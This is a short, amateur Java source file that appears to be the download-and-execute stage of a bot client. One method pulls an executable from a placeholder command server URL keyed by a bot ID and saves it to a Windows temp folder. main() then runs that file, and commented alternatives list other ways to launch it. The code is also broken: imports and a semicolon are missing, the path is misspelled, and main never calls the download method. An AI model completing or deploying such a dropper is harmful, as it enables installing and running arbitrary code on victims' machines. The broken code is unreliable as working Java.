//this should be interesting, first java program

public class main{

	public static void downloadAndExecuteCode() throws Exception {
		//downloading the executable from webserver, neeeds to be changed to real server
		try(

		  //Connect to webpage and begin to download executable
		  ReadableByteChannel in=Channels.newChannel(
		    new URL("http://<SERVER_IP/HOSTNAME>/<BOT_ID>/commands/file.exe").openStream());
		  
		  //Save file to tmp directory for quick execution
		  FileChannel out=new FileOutputStream(
		    "C:\\Winodws\\tmp\\file.exe").getChannel() ) {

		  out.transferFrom(in, 0, Long.MAX_VALUE); 
		}
	}
		//use process builder to create process to run downloaded .exe
		//ProcessBuilder pb = new ProcessBuilder(pathToExe);
		//Map<String, String> env = pb.environment();

		//OR use ExecuteSystemCommand to run the command

		//List<String> command = new ArrayList<String>();
		//command.add("./file.exe")

		//OR use Process function, duh
	public static void main(String[] args) throws Exception {
			String[] cmd = { "C:\\Winodws\\tmp\\file.exe" }
			Process p = Runtime.getRuntime().exec(cmd);
			p.waitFor();
	}
}

